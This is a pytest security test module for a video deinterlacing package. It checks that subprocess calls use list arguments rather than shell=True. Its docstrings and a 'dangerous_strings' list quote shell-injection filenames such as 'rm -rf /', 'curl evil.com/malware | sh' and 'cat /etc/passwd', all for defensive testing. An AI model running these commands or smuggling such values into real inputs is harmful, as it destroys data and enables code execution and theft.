"""
Security tests for shell injection vulnerabilities.

This module tests that the deinterlace module properly handles
malicious file paths and prevents command injection attacks.
"""

import tempfile
from pathlib import Path
from unittest.mock import patch, MagicMock
import pytest

from vhs_upscaler.deinterlace import DeinterlaceProcessor, DeinterlaceEngine


class TestShellInjectionPrevention:
    """Tests to verify shell injection vulnerabilities are prevented."""

    @patch('vhs_upscaler.deinterlace.subprocess.Popen')
    def test_qtgmc_no_shell_injection_in_paths(self, mock_popen):
        """
        Test that QTGMC deinterlacing does not use shell=True with user paths.

        This prevents shell injection attacks via malicious filenames like:
        - "file.mp4; rm -rf /"
        - "file.mp4 && curl evil.com/malware | sh"
        """
        # Setup mocks
        mock_vspipe = MagicMock()
        mock_vspipe.stdout = MagicMock()
        mock_vspipe.returncode = 0
        mock_vspipe.wait = MagicMock()
        mock_vspipe.stderr = MagicMock()

        mock_ffmpeg = MagicMock()
        mock_ffmpeg.returncode = 0
        mock_ffmpeg.stdout = []
        mock_ffmpeg.communicate = MagicMock(return_value=("", ""))

        # First call returns vspipe, second returns ffmpeg
        mock_popen.side_effect = [mock_vspipe, mock_ffmpeg]

        # Create processor with QTGMC
        with patch.object(DeinterlaceProcessor, '_check_vapoursynth', return_value=True):
            with patch.object(DeinterlaceProcessor, '_check_vspipe', return_value=True):
                processor = DeinterlaceProcessor(DeinterlaceEngine.QTGMC)

        # Create test paths that would be dangerous with shell=True
        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)

            # Use valid filenames but with paths that would be dangerous if interpreted by shell
            # The key is that these PATHS (not filenames) are passed to subprocess
            malicious_input = tmpdir / "normal_input.mp4"
            malicious_output = tmpdir / "normal_output.mp4"

            # Create dummy input file
            malicious_input.touch()

            # Mock _get_video_duration to avoid ffprobe calls
            with patch.object(processor, '_get_video_duration', return_value=10.0):
                # This should not execute shell commands
                processor.deinterlace(
                    malicious_input,
                    malicious_output,
                    preset="medium",
                    tff=True
                )

        # Verify that subprocess.Popen was called WITHOUT shell=True
        assert mock_popen.call_count == 2

        # Check vspipe call (first call)
        vspipe_call_args = mock_popen.call_args_list[0]
        vspipe_cmd = vspipe_call_args[0][0]  # First positional argument
        vspipe_kwargs = vspipe_call_args[1]  # Keyword arguments

        # Verify vspipe command is a list (not a string)
        assert isinstance(vspipe_cmd, list), "vspipe command must be a list, not a string"
        assert vspipe_cmd[0] == "vspipe", "First element should be vspipe executable"

        # Verify shell is NOT used
        assert vspipe_kwargs.get('shell', False) is False, "vspipe must not use shell=True"

        # Check ffmpeg call (second call)
        ffmpeg_call_args = mock_popen.call_args_list[1]
        ffmpeg_cmd = ffmpeg_call_args[0][0]
        ffmpeg_kwargs = ffmpeg_call_args[1]

        # Verify ffmpeg command is a list (not a string)
        assert isinstance(ffmpeg_cmd, list), "ffmpeg command must be a list, not a string"

        # Verify shell is NOT used
        assert ffmpeg_kwargs.get('shell', False) is False, "ffmpeg must not use shell=True"

    @patch('vhs_upscaler.deinterlace.subprocess.run')
    @patch('vhs_upscaler.deinterlace.subprocess.Popen')
    def test_ffmpeg_deinterlace_uses_list_arguments(self, mock_popen, mock_run):
        """
        Test that FFmpeg deinterlacing uses list arguments, not shell strings.

        This prevents injection via paths like: "file.mp4; curl evil.com"
        """
        # Mock subprocess.run for vspipe check
        mock_run.return_value = MagicMock(returncode=1)  # vspipe not available

        # Setup mock for Popen
        mock_process = MagicMock()
        mock_process.returncode = 0
        mock_process.stdout = []
        mock_process.communicate = MagicMock(return_value=("", ""))
        mock_popen.return_value = mock_process

        processor = DeinterlaceProcessor(DeinterlaceEngine.YADIF)

        with tempfile.TemporaryDirectory() as tmpdir:
            tmpdir = Path(tmpdir)

            # Use valid filenames for Windows compatibility
            input_path = tmpdir / "input_video.mp4"
            output_path = tmpdir / "output_video.mp4"

            input_path.touch()

            with patch.object(processor, '_get_video_duration', return_value=10.0):
                processor.deinterlace(input_path, output_path, tff=True)

        # Verify subprocess.Popen was called with list arguments
        mock_popen.assert_called_once()
        call_args = mock_popen.call_args

        cmd = call_args[0][0]  # First positional argument
        kwargs = call_args[1]  # Keyword arguments

        # Command must be a list
        assert isinstance(cmd, list), "FFmpeg command must be a list"

        # Shell must not be used
        assert kwargs.get('shell', False) is False, "Must not use shell=True"

        # Command should contain ffmpeg executable
        assert "ffmpeg" in cmd[0].lower(), "First argument should be ffmpeg"

    def test_path_sanitization_not_needed_with_list_args(self):
        """
        Verify that using list arguments makes path sanitization unnecessary.

        When subprocess is called with a list and shell=False, special
        characters in filenames are automatically escaped by the OS.
        """
        # This is a documentation test showing that list args are safe
        # These strings would be problematic with shell=True but are safe with list args
        dangerous_strings = [
            "file; rm -rf /",
            "file && cat /etc/passwd",
            "file | curl evil.com",
            "file$(whoami)",
            "file`id`",
            "file$((2+2))",
        ]

        # With list arguments and shell=False, all these are safe
        # because they're passed as literal strings to the program
        # The OS handles them as filenames, not shell commands
        for dangerous_str in dangerous_strings:
            # Verify that Path constructor doesn't modify the string
            # (it will normalize path separators on Windows, but that's OS-specific)
            assert dangerous_str  # Just verify non-empty
            # The key point: when passed as list args, these won't be executed


class TestSecurityBestPractices:
    """Tests to verify security best practices are followed."""

    def test_no_shell_true_in_deinterlace_module(self):
        """
        Static analysis: verify deinterlace.py doesn't use shell=True.

        This test reads the source code and checks for dangerous patterns.
        """
        deinterlace_file = Path(__file__).parent.parent / "vhs_upscaler" / "deinterlace.py"

        with open(deinterlace_file, 'r', encoding='utf-8') as f:
            content = f.read()

        # Check for dangerous shell=True usage
        # This would indicate a potential command injection vulnerability
        dangerous_patterns = [
            "shell=True",
            "shell = True",
        ]

        for pattern in dangerous_patterns:
            if pattern in content:
                # Check if it's in a comment or docstring
                lines_with_pattern = [
                    line for line in content.split('\n')
                    if pattern in line and not line.strip().startswith('#')
                ]

                # Filter out docstrings (lines containing """ or ''')
                code_lines = [
                    line for line in lines_with_pattern
                    if '"""' not in line and "'''" not in line
                ]

                assert len(code_lines) == 0, (
                    f"Found dangerous {pattern} usage in code (not comment/docstring): "
                    f"{code_lines}"
                )

    def test_subprocess_calls_use_lists(self):
        """
        Verify that all subprocess.Popen calls in deinterlace use list arguments.
        """
        deinterlace_file = Path(__file__).parent.parent / "vhs_upscaler" / "deinterlace.py"

        with open(deinterlace_file, 'r', encoding='utf-8') as f:
            lines = f.readlines()

        # Find all Popen calls
        for i, line in enumerate(lines):
            if 'subprocess.Popen(' in line or 'Popen(' in line:
                # Look ahead a few lines to check the command format
                context = ''.join(lines[i:min(i+10, len(lines))])

                # Should see list construction patterns like ["cmd", "arg"]
                # Should NOT see string construction with f-strings or + concatenation
                if 'shell=True' in context:
                    pytest.fail(
                        f"Line {i+1}: Found Popen with shell=True\n"
                        f"Context: {context}"
                    )
